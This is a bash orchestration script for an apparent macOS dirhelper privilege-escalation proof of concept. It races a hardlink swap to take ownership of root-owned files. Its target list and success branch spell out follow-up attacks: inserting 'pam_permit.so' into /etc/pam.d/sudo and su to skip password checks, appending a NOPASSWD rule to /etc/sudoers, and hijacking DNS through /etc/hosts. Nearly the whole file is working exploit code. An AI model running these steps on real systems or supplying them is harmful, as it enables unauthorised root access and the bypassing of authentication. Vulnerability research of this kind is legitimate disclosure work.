#!/bin/bash
#
# exploit.sh - Glarus PoC Main Exploit Script
#
# Orchestrates the complete attack:
# 1. Sets up the hardlink structure
# 2. Starts the race condition binary
# 3. Triggers dirhelper repeatedly
# 4. Reports success or failure
#
# Usage:
#   ./exploit.sh <target_file>
#   ./exploit.sh --test <target_file>
#   ./exploit.sh --list
#
# Environment Variables:
#   GLARUS_MAX_ATTEMPTS  - Maximum race attempts (default: 50000)
#   GLARUS_RACE_MODE     - Race mode: spin, kqueue, hybrid (default: spin)
#   GLARUS_TRIGGERS      - Number of dirhelper triggers (default: 5000)
#
# Copyright (c) 2025 Golden Helm Securities
#

set -e

SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
ROOT_DIR="$(dirname "$SCRIPT_DIR")"
BUILD_DIR="$ROOT_DIR/build"

# Use a simple fixed bundle ID - no need for dynamic IDs
# The container we attack is separate from DirhelperClient.app's container
BUNDLE_ID="${GLARUS_BUNDLE_ID:-com.glarus.poc}"
CONTAINER_BASE="$HOME/Library/Containers/$BUNDLE_ID"

# Use the sandboxed app (required - dirhelper checks audit token)
CLIENT_APP="$BUILD_DIR/DirhelperClient.app/Contents/MacOS/DirhelperClient"
RACE_BINARY="$BUILD_DIR/race_swap"

# Default configuration
MAX_ATTEMPTS="${GLARUS_MAX_ATTEMPTS:-50000}"
RACE_MODE="${GLARUS_RACE_MODE:-spin}"
TRIGGER_COUNT="${GLARUS_TRIGGERS:-5000}"
DEFAULT_TARGET="/etc/hosts"

#â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
# Helper Functions
#â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€

usage() {
    cat << 'EOF'
â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
  Glarus PoC - macOS dirhelper Privilege Escalation
â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

Usage:
  ./exploit.sh <target_file>         Run exploit against target file
  ./exploit.sh --test <target_file>  Test if target can be exploited
  ./exploit.sh --list                List suggested targets
  ./exploit.sh --help                Show this help

Environment Variables:
  GLARUS_MAX_ATTEMPTS=50000   Maximum race attempts
  GLARUS_RACE_MODE=spin       Race mode: spin, kqueue, hybrid
  GLARUS_TRIGGERS=5000        Number of dirhelper triggers

Examples:
  ./exploit.sh /etc/hosts
  ./exploit.sh /etc/newsyslog.conf
  GLARUS_RACE_MODE=hybrid ./exploit.sh /etc/asl.conf

EOF
}

list_targets() {
    cat << 'EOF'
â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
  Suggested Target Files
â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

Confirmed Exploitable (typically no additional protections):
  /etc/hosts              DNS hijacking
  /etc/newsyslog.conf     Log rotation â†’ file overwrite
  /etc/asl.conf           System logging configuration
  /etc/resolv.conf        DNS resolver configuration
  /etc/ntp.conf           NTP configuration

TCC Protected (may require user consent):
  /etc/pam.d/sudo         Bypass sudo authentication
  /etc/pam.d/su           Bypass su authentication
  /etc/sudoers            Add NOPASSWD rule

SIP Protected (require SIP disabled):
  /System/*               System files
  /usr/*                  User binaries

Test with: ./exploit.sh --test <target_file>

EOF
}

test_target() {
    local target="$1"
    local test_dir="/tmp/glarus_test_$$"
    
    echo "â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•"
    echo "  Testing Target: $target"
    echo "â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•"
    echo
    
    # Check file exists
    if [ ! -f "$target" ]; then
        echo "[âœ—] File does not exist"
        return 1
    fi
    echo "[âœ“] File exists"
    
    # Check readable
    if [ ! -r "$target" ]; then
        echo "[âœ—] File is not readable"
        return 1
    fi
    echo "[âœ“] File is readable"
    
    # Check filesystem
    local target_fs=$(df "$target" 2>/dev/null | tail -1 | awk '{print $1}')
    local container_fs=$(df "$HOME/Library" 2>/dev/null | tail -1 | awk '{print $1}')
    
    echo
    echo "Filesystem check:"
    echo "  Target:    $target_fs"
    echo "  Container: $container_fs"
    
    if [ "$target_fs" != "$container_fs" ]; then
        echo
        echo "[âœ—] DIFFERENT FILESYSTEMS - hardlink will fail"
        return 1
    fi
    echo "[âœ“] Same filesystem"
    
    # Try hardlink
    echo
    echo "Testing hardlink creation..."
    mkdir -p "$test_dir"
    
    if ln "$target" "$test_dir/test_link" 2>/dev/null; then
        echo "[âœ“] Hardlink created successfully"
        rm -rf "$test_dir"
        echo
        echo "â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•"
        echo "  âœ“ TARGET IS EXPLOITABLE"
        echo "â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•"
        echo
        echo "Run: ./exploit.sh $target"
        return 0
    else
        echo "[âœ—] Hardlink creation failed"
        rm -rf "$test_dir"
        echo
        echo "Possible reasons:"
        echo "  â€¢ SIP protection"
        echo "  â€¢ TCC restrictions"
        echo "  â€¢ File flags (immutable)"
        echo
        echo "â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•"
        echo "  âœ— TARGET IS NOT EXPLOITABLE"
        echo "â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•"
        return 1
    fi
}

#â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
# Main Exploit Function
#â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€

run_exploit() {
    local target="$1"
    
    echo "â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•"
    echo "  Glarus PoC - Running Exploit"
    echo "â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•"
    echo
    echo "Bundle ID:    $BUNDLE_ID"
    echo "Target:       $target"
    echo "Race Mode:    $RACE_MODE"
    echo "Max Attempts: $MAX_ATTEMPTS"
    echo "Triggers:     $TRIGGER_COUNT"
    echo
    
    # Check build exists
    if [ ! -x "$CLIENT_APP" ]; then
        echo "ERROR: DirhelperClient not found."
        echo "       Run ./scripts/build.sh first"
        exit 1
    fi
    echo "[âœ“] DirhelperClient found"
    
    if [ ! -x "$RACE_BINARY" ]; then
        echo "ERROR: race_swap binary not found."
        echo "       Run ./scripts/build.sh first"
        exit 1
    fi
    echo "[âœ“] Race binary found"
    
    # Quick hardlink test
    local test_dir="/tmp/glarus_quick_$$"
    mkdir -p "$test_dir"
    if ! ln "$target" "$test_dir/test" 2>/dev/null; then
        echo "ERROR: Cannot create hardlink to $target"
        echo "       Run './exploit.sh --test $target' for details"
        rm -rf "$test_dir"
        exit 1
    fi
    rm -rf "$test_dir"
    echo "[âœ“] Hardlink test passed"
    
    # Calculate buffer size for truncation
    local container_path="$CONTAINER_BASE/Data"
    local container_len=${#container_path}
    local buffer_size=$((container_len + 5))
    echo "[âœ“] Buffer size: $buffer_size (triggers truncation)"
    
    # Setup hardlink structure
    echo
    echo "[*] Setting up hardlink structure..."
    chmod u+x "$SCRIPT_DIR/setup.sh"
    "$SCRIPT_DIR/setup.sh" "$target"
    
    # Record original owner
    local original_owner=$(stat -f "%u" "$target" 2>/dev/null || stat -c "%u" "$target")
    local my_uid=$(id -u)
    
    # Start race binary in background
    echo
    echo "[*] Starting race binary (mode: $RACE_MODE)..."
    "$RACE_BINARY" -c "$BUNDLE_ID" -m "$RACE_MODE" -n "$MAX_ATTEMPTS" -t "$target" &
    local race_pid=$!
    echo "    PID: $race_pid"
    
    # Wait for race binary to initialize
    sleep 0.5
    
    # Trigger dirhelper repeatedly
    echo
    echo "[*] Triggering dirhelper ($TRIGGER_COUNT times)..."
    local attempt=0
    while [ $attempt -lt $TRIGGER_COUNT ]; do
        # Trigger dirhelper with truncation-inducing buffer size
        # Show output for first call (includes symlink test)
        if [ $attempt -eq 0 ]; then
            "$CLIENT_APP" "$BUNDLE_ID" 1 "$buffer_size" 2>&1 || true
            echo
        else
            "$CLIENT_APP" "$BUNDLE_ID" 1 "$buffer_size" > /dev/null 2>&1 || true
        fi
        attempt=$((attempt + 1))
        
        # Progress indicator
        if [ $((attempt % 500)) -eq 0 ]; then
            printf "\r    Progress: %d/%d" "$attempt" "$TRIGGER_COUNT"
            
            # Check if race already won
            if ! kill -0 $race_pid 2>/dev/null; then
                break
            fi
        fi
        
        # Small delay to avoid overwhelming the system
        sleep 0.001 2>/dev/null || true
    done
    
    echo
    echo
    
    # Stop race binary if still running
    if kill -0 $race_pid 2>/dev/null; then
        kill $race_pid 2>/dev/null || true
        wait $race_pid 2>/dev/null || true
    fi
    
    # Check result
    local new_owner=$(stat -f "%u" "$target" 2>/dev/null || stat -c "%u" "$target")
    
    echo "â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•"
    
    if [ "$new_owner" = "$my_uid" ]; then
        echo
        echo "  ğŸ‰ SUCCESS! You now own: $target"
        echo
        echo "â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•"
        echo
        echo "File ownership changed:"
        echo "  Before: uid=$original_owner (root)"
        echo "  After:  uid=$new_owner (you)"
        echo
        ls -la "$target"
        echo
        
        # Exploitation hints
        case "$target" in
            */pam.d/sudo)
                echo "Next steps for privilege escalation:"
                echo "  echo 'auth sufficient pam_permit.so' | cat - $target > /tmp/sudo_new"
                echo "  cp /tmp/sudo_new $target"
                echo "  sudo -s   # No password required!"
                ;;
            */pam.d/su)
                echo "Next steps for privilege escalation:"
                echo "  echo 'auth sufficient pam_permit.so' | cat - $target > /tmp/su_new"
                echo "  cp /tmp/su_new $target"
                echo "  su   # No password required!"
                ;;
            */sudoers)
                echo "Next steps for privilege escalation:"
                echo "  echo '$USER ALL=(ALL) NOPASSWD: ALL' >> $target"
                echo "  sudo -s   # No password required!"
                ;;
            */hosts)
                echo "You can now modify DNS entries:"
                echo "  echo '192.168.1.100 target-site.com' >> $target"
                ;;
            */newsyslog.conf)
                echo "You can now configure log rotation to overwrite files:"
                echo "  Add entries to rotate logs into sensitive locations"
                ;;
            *)
                echo "You now have write access to this file."
                ;;
        esac
        echo
        return 0
    else
        echo
        echo "  âœ— Exploit did not succeed"
        echo
        echo "â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•"
        echo
        echo "Owner unchanged: uid=$new_owner (wanted: $my_uid)"
        echo
        echo "Tips:"
        echo "  â€¢ Run again (race conditions are probabilistic)"
        echo "  â€¢ Try spin mode: GLARUS_RACE_MODE=spin ./exploit.sh $target"
        echo "  â€¢ Increase attempts: GLARUS_MAX_ATTEMPTS=100000 ./exploit.sh $target"
        echo
        return 1
    fi
}

#â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
# Main
#â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€

if [ $# -eq 0 ]; then
    usage
    exit 0
fi

case "$1" in
    --help|-h)
        usage
        ;;
    --list|-l)
        list_targets
        ;;
    --test|-t)
        if [ -z "$2" ]; then
            echo "Usage: $0 --test <target_file>"
            exit 1
        fi
        test_target "$2"
        ;;
    -*)
        echo "Unknown option: $1"
        usage
        exit 1
        ;;
    *)
        run_exploit "$1"
        ;;
esac
